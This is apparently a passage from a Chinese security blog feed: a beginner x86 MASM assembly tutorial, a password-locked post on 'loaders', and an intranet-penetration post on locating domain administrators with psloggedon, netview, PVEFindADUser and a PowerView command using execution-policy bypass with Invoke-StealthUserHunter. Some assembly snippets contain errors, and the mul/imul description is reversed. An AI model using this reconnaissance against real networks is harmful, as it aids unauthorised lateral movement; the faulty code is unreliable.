class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">INCLUDELIB kernel32.lib<br>INCLUDELIB user32.lib<br> <br>.386<br>.model flat,stdcall<br> <br>MessageBoxA PROTO,<br>hwnd:DWORD,<br>lpText:DWORD,<br>lpCaption:DWORD,<br>uType:DWORD<br> <br>ExitProcess PROTO,<br>dwExitCode:DWORD<br> <br>.data<br>msg byte <span class="hljs-string">&#x27;Hello,Assembly!&#x27;</span><br> <br>.code<br>main Proc<br>mov eax,offset msg<br>push 0h<br>push 0h<br>push eax<br>push 0h<br>call MessageBoxA<br>push 0h<br>call ExitProcess<br>main endp<br>end main<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/acf89f3c32aa45e3a53afd93465365b0.png" alt="在这里插入图片描述"></p><p>这里记录一个坑点，我本来得用的vs2019但是搭建汇编环境死活有问题，最后换了vs2017一配置立马ok</p><ul><li><strong>三类： 通用寄存器、专用寄存器、段寄存器</strong></li></ul><p>1.通用寄存器<br>数据寄存器:ax、bx、cx、dx<br>ax:作为累加器使用，是算术运算的主要寄存器<br>bx:可以作为通用寄存器，此外在计算储存地址时，它经常用作基址寄存器<br>cx:可以作为通用寄存器，此外在循环和串处理指令中作隐含的计数器<br>dx:可以作为通用寄存器，在作双字长运算时用来存放高位字</p><p>2.专用寄存器<br>IP:为指令指针寄存器，用来存放代码段中的偏移地址，在程序运行过程中，它始终指向下一条指令的首地址，它与cs寄存器联用确定下一条指令的物理地址<br>SP:为堆栈指针寄存器<br>PSW:程序状态字寄存器。由条件码标志、控制标志和系统标志构成</p><p>3.段寄存器<br>代码段CS:存放当前正在运行的程序<br>数据段DS:存放当前运行程序所用的数据<br>段栈段SS:定义来堆栈的所在区域。堆栈一种数据结构，它开辟了一个比较特殊的存储区，并以后进先出的方式来访问这一区域<br>附加段ES:是附加的数据段，它是一个辅助的数据区，也是串处理指令的目的操作数存放区</p><p>数据类型<br><img src="https://img-blog.csdnimg.cn/988a0e70463b4f4e90b634d306206428.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/50e6435b10954c6e900bbb7fc37f58d6.png" alt="在这里插入图片描述"></p><ul><li><strong>offset</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>szStr db <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br>num dword <span class="hljs-number">5</span><br>arrNum DWORD <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br>var1 db ?<br>.code<br>main proc<br>mov eax,offset arrNum + <span class="hljs-number">4</span><br>mov eax,[eax]<br>mov eax,<span class="hljs-number">7</span><br>add ebx,<span class="hljs-number">6</span><br>sub eax,ebx<br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>jmp和loop</strong><br>jmp<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br><br>.code<br>main proc<br><span class="hljs-keyword">xor</span> eax,eax<br>lp:<br>inc eax<br>jmp lp ;跳转到lp处继续执行<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>loop<br>可以规定循环次数<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br><br>.code<br>main proc<br><span class="hljs-keyword">xor</span> eax,eax<br>mov ecx,<span class="hljs-number">10</span> ;规定执行的次数<br>lp:<br>inc eax<br>loop[ lp ;跳转到lp处继续执行<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>复制字符串</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>source byte <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br><span class="hljs-function">target byte <span class="hljs-keyword">sizeof</span> source <span class="hljs-title">dup</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function">.code</span><br><span class="hljs-function">main proc</span><br><span class="hljs-function">mov esi,0</span><br><span class="hljs-function">mov ecx,<span class="hljs-keyword">sizeof</span> source</span><br><span class="hljs-function">lp:</span><br><span class="hljs-function">mov al,source[esi]</span><br><span class="hljs-function">mov target[esi],al</span><br><span class="hljs-function">inc esi</span><br><span class="hljs-function">loop lp</span><br><span class="hljs-function">push <span class="hljs-number">0</span></span><br><span class="hljs-function">call ExitProcess</span><br><span class="hljs-function">add esp,<span class="hljs-number">4</span></span><br><span class="hljs-function">main ENDP</span><br><span class="hljs-function">END main</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>-<strong>栈、堆操作</strong><br>栈 ：<br>先进后出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>source byte <span class="hljs-string">&quot;my name is iDea&quot;</span>,<span class="hljs-number">0</span><br>sourcesize=($-source)<span class="hljs-number">-1</span> ;获取source字符串长度<br>.code<br>main proc<br>mov ecx,sourcesize<br>mov esi,<span class="hljs-number">0</span><br>l1:<br>movzx eax,source[esi]<br>push eax<br>inc esi  ;inc 对指定操着数+<span class="hljs-number">1</span>处理<br>loop l1<br>mov ecx,sourcesize<br>mov esi,<span class="hljs-number">0</span><br>l2:<br>pop eax<br>mov source[esi],al<br>inc esi<br>loop l2<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>定义函数</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addx proc uses esi ecx  ;定义函数<br>add esi,ecx<br>mov eax,esi<br>ret  ;返回值<br>addx endp<br><br>main proc<br>mov esi,<span class="hljs-number">5</span><br>mov ecx,<span class="hljs-number">6</span><br>push esi<br>push ecx<br>call addx<br>INVOKE ExitProcess, <span class="hljs-number">0</span><br>main ENDP<br></code></pre></td></tr></table></figure><ul><li><strong>循环</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">main proc<br>mov eax,o1<br>mov eax,o2<br>jnz L1 ;如果相等就向下执行，如果不相等就指定L1处<br>mov x,<span class="hljs-number">1</span><br>mov y,<span class="hljs-number">1</span><br>L1:<br>push <span class="hljs-number">0</span><br>call  ExitProcess<br>add exp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">main proc<br>mov eax,o1<br>mov eax,o2<br>jnz L1<br>mov x,<span class="hljs-number">1</span><br>mov y,<span class="hljs-number">1</span><br>jmp L2 ;执行完跳转到l2处<br>L1:<br>mov x,<span class="hljs-number">2</span><br>mov y,<span class="hljs-number">2</span><br>L2:<br>push <span class="hljs-number">0</span><br>call  ExitProcess<br>add exp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>条件控制</strong><br>if<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.endif ;<span class="hljs-keyword">if</span>条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>if-else</li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.else<br>dec eax<br>.endif ;条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>if-elseif-else</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.if eax &gt; i <br>inc eax<br>.elseif eax &lt; i<br>add eax,<span class="hljs-number">2</span><br>.else<br>dec eax<br>.endif<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>while</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">102</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.while eax &lt; i  <br>inc eax<br>.endw ;条件结束标志<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>do..while</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br>.data<br>i dword <span class="hljs-number">100</span><br>.code<br>main proc<br>mov eax,<span class="hljs-number">101</span><br>.repeat<br>inc eax<br>.until eax &gt; <span class="hljs-number">105</span><br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><ul><li><strong>乘法</strong></li></ul><p>有符号  mul  div<br>无符号  imul  idiv</p><p>乘数bl bx ebx<br>被乘数 al ax eax</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">main proc<br>mov al,<span class="hljs-number">5</span>h<br>mov bl,<span class="hljs-number">10</span>h<br>mul bl<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br></code></pre></td></tr></table></figure><ul><li><strong>结构与宏</strong><br>结构体：</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br><br>iDea <span class="hljs-keyword">struct</span>  ;声明结构体<br>sd1 dword ?<br>sd2 dword ?<br>iDea ends<br><br>.data<br>myiDea iDea &lt;&gt;<br>.code<br><br>main proc<br>mov myiDea.sd1,<span class="hljs-number">1</span><br>mov eax,myiDea.sd1<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure><p>宏:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">.586</span><br>.MODEL flat,stdcall<br>option casemap:none<br><br>include windows.inc<br>include user32.inc<br>include kernel32.inc<br>includelib user32.lib<br>includelib kernel32.lib<br><br>iDea macro <span class="hljs-type">char</span>;定义宏<br>mov eax,<span class="hljs-type">char</span><br>endm<br><br>main proc<br>iDea <span class="hljs-number">9</span><br>mov eax,eax<br>push <span class="hljs-number">0</span><br>call ExitProcess<br>add esp,<span class="hljs-number">4</span><br>main ENDP<br>END main<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各类Loader</title>
    <link href="/2022/06/16/%E5%90%84%E7%B1%BBLoader/index/"/>
    <url>/2022/06/16/%E5%90%84%E7%B1%BBLoader/index/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="b1789c53f4108a9202178b4c6cf251a40a94a41d33cf0cb0ae08c3b76f77f04f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>定位域管理员</title>
    <link href="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/"/>
    <url>/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/</url>
    
    <content type="html"><![CDATA[<p>内网渗透与常规的渗透测试是截然不同 的。内网渗透测试的需求是，获取内网中特定用户或机器的权限，进而获得特定的资源，对内网的安全性进行评估。</p><h2 id="域管理定位概述"><a href="#域管理定位概述" class="headerlink" title="域管理定位概述"></a>域管理定位概述</h2><p>  在内网中，通常会部署大量的网络安全系统和设备，列入IDS,IPS,日志审计，安全网关，反病毒软件等。在域网络攻击测试中，获取域管理员权限。<br>      在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。也就是说，当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，具备完全控制权限。<br>    定位域内管理员的常规渠道，一是日志，而是会话。日志是指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出并查看。会话是指域内每台机器的登录会话，可以使用netsess.exe或PowerView等工具查询(可以匿名查询，不需要权限)</p><h2 id="常用域管理员定位工具"><a href="#常用域管理员定位工具" class="headerlink" title="常用域管理员定位工具"></a>常用域管理员定位工具</h2><p>常用的域管理员定位工具有psloggedon.exe,PVEFindADUser.exe,netsess.exe,以及hunter,NetView等，在powershell中，常用的工具是PowerView。<br><strong>1.Psloggedon.exe</strong><br>在windows平台上，可以执行命令”net session”来查看谁使用了本机资源，但是没有命令可以用来查看谁在使用远程计算机资源，谁登录了本地或远程计算机。<br>使用psloggedon.exe，可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录用户。如果指定的是用户名而不是计算机名，psloggedon.exe会搜索网上邻居中的计算机，并显示该用户当前是否已经登录。其原理是通过检查注册表HKEY_USERS项的key值来查询谁登录过，但某些功能需要管理员权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">psloggedon [-] [-x] [-l] [\\computername| username]<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210429233354452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>-l：仅显示本地登录，不显示本地和网络资源登录。</li><li>-x: 不显示登录时间。</li><li>\computername  指定要列出登录信息的计算机的名称。</li><li>username: 指定用户名，在网络中搜索该用户登录的计算机。</li></ul><p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><p>2.<strong>PVEFindADUser.exe</strong><br>PVEFindADUser.exe可用于查找活动目录用户登录的位置，枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要配置 .NET Framework2.0环境，并且需要具有管理员权限。<br><img src="https://img-blog.csdnimg.cn/20210430131109497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我的没连接成功，不知道为什么，希望有大佬告诉我。</p><ul><li>-u:检查程序是否有新版本</li><li>-current [‘username’]:如果仅指定-current参数，将获取目标计算机上当前登录的所有用户。如果指定用户名(Domain\Username),则显示该用户登录的计算机。</li><li>last[“username”]:如果仅指定了 -last参数，将获取目标计算机的最后一个登录用户，如果指定了用户名(Domain\username），则显示此用户上次登录的计算机。根据网络的安全策略。可能会隐藏最后一个登录用户的用户名，此时使用该工具可能无法得到该用户名。</li><li>noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行Ping命令。</li><li>target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机，如果指定此参数，则后跟一个由逗号分隔的主机名列表。</li></ul><p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a><br><strong>3.netview.exe</strong><br> netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登录会话， 利用 NetShareEnum 找寻共享，利用 NetWkstaUserEnum 枚举登录的用户。同时，netview.exe 能够 查询共享入口和有价值用户。netview.exe的绝大部分功能不需要管理员权限就可以使用。<br><img src="https://img-blog.csdnimg.cn/20210430134829728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>-f filename.txt:指定从中提取主机列表的文件。</li><li>-e filename.txt:指定要排除的主机名文件。</li><li>-o filename.txt:将所有输出重定向到文件。</li><li>-d domain:指定从中提取主机列表的域。如果没有指定，则使用当前域。</li><li>-g group:指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。</li><li>-c:检查对已找到共享的访问权限。</li></ul><p>下载地址：<a href="https://malicious.link/projects/netview.exe">https://malicious.link/projects/netview.exe</a></p><p><strong>4.PowerView脚本</strong><br>PowerView是一款powershell脚本，提供了辅助定位关键用户的功能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span>  bypass -Command <span class="hljs-string">&quot;&amp; (Import-Module .\PowerView.ps1; Invoke-StealthUserHunter)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210430142150756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>Invoke-StealthUserHunter 